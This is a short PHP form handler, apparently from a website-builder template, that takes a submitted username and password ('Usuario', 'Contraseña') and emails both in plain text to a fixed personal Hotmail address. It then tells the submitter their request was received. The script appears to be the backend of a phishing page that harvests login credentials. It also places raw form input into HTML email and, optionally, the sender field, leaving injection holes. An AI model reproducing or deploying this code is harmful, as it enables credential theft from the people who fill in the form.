<?php
//Check Captcha
include("../captcha/imkeys.php");
for ($i=0; $i<5; $i++)
  if ($oCharList[substr($_POST["Itm_8_00_cpf"],$i,1)] != substr($_POST["Itm_8_00_cpv"], $i,1))
    die("Error: Javascript must be enabled! (2)");

include "../res/imemail.inc.php";

//Form Data
$txtData = "";
$htmData = "";
$txtData .= "Usuario: " . $_POST["Itm_8_00_1"] . "\r\n";
$htmData .= "<tr><td width=\"25%\"><b>Usuario:</b></td><td>" . $_POST["Itm_8_00_1"] . "</td></tr>";
$csvData .= $_POST["Itm_8_00_1"] . ";";
$txtData .= "Contraseña: " . $_POST["Itm_8_00_2"] . "\r\n";
$htmData .= "<tr><td width=\"25%\" bgcolor=\"#EEEEEE\"><b>Contraseña:</b></td><td bgcolor=\"#EEEEEE\">" . $_POST["Itm_8_00_2"] . "</td></tr>";
$csvData .= $_POST["Itm_8_00_2"] . ";";

// Template
$htmHead = "<table width=\"90%\" border=\"0\" bgcolor=\"#FFFFFF\" cellpadding=\"4\" style=\"font: 11px Tahoma; color: #000000; border: 1px solid #BBBBBB;\">";
$htmFoot = "</table>";

//Send email to owner
$txtMsg = "Solicitud Varia";
$htmMsg = $htmHead . "<tr><td>Solicitud Varia</td></tr>" . $htmFoot;
$oEmail = new imEMail(($imForceSender ? $_POST["Itm_8_00_1"] : "francisco.matute1997@hotmail.com"),"francisco.matute1997@hotmail.com","Solicitud","-???-");
$oEmail->setText($txtMsg . "\r\n\r\n" . $txtData);
$oEmail->setHTML("<html><body bgcolor=\"#063A69\"><center>" . $htmMsg . "<br>" . $htmHead . $htmData . $htmFoot . "<br>" . $htmHead . "<tr><td style=\"font-size: 85%\">" . $csvData . "</td></tr>" . $htmFoot . "</center></body></html>");
$oEmail->send();

//Send email to user
$txtMsg = "Tu mensaje ha sido recibido exitosamente, pronto se le dara fecha de retiro a su solicitud";
$htmMsg = $htmHead . "<tr><td>Tu mensaje ha sido recibido exitosamente, pronto se le dara fecha de retiro a su solicitud</td></tr>" . $htmFoot;
$oEmail = new imEMail("francisco.matute1997@hotmail.com",$_POST["Itm_8_00_1"],"Re: Solicitud","-???-");
$oEmail->setText($txtMsg . "\r\n\r\n" . $txtData);
$oEmail->setHTML("<html><body bgcolor=\"#063A69\"><center>" . $htmMsg . "<br>" . $htmHead . $htmData . $htmFoot . "</center></body></html>");
$oEmail->send();
@header("Location: ../solicitudes.html");
?>
